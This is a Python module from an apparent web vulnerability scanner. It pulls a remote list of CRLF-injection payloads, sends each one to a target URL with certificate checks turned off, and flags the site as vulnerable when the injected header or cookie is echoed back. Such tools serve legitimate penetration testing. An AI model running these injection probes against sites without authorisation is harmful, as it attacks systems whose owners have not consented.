import requests
from includes import writefile
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


class Colors:
    RED = '\x1b[31;1m'
    BLUE = '\x1b[34;1m'
    GREEN = '\x1b[32;1m'
    RESET = '\x1b[0m'
    MAGENTA = '\x1b[35;1m'


payloads = "https://raw.githubusercontent.com/karthi-the-hacker/PayloadAllTheThings/main/crlfi.txt"


def scan(url,output):
    payload = requests.get(payloads)
   
    for line in payload.text.splitlines():
        payload_url = f'{url}/{line}'
        crlf = requests.get(payload_url, allow_redirects=False, verify=False)
        print(f'Scaning ====> {url}/{line}')
        crlfi_header = crlf.headers.get('crlfi', None)
        setcookie = crlf.headers.get('Set-Cookie', None)
        if crlfi_header or (setcookie and "karthithehacker" in setcookie):
            outputprint = (
                f"\n{Colors.RED}💸[Vulnerable]{Colors.RESET} ======> "
                f"{Colors.BLUE}{url}{Colors.RESET} "
                f"{Colors.GREEN}🚨[Payload] ======> {line}{Colors.RESET}\n"
                f"{Colors.MAGENTA}📸PoC-Url->{Colors.BLUE}${Colors.RESET} {url}/{line}\n\n\n"
            )
            print(outputprint)
            if output is not None:
                writefile.writedata(str(output), str(f'{url}/{line}\n'))
            break
        else:
            a=1
      
        
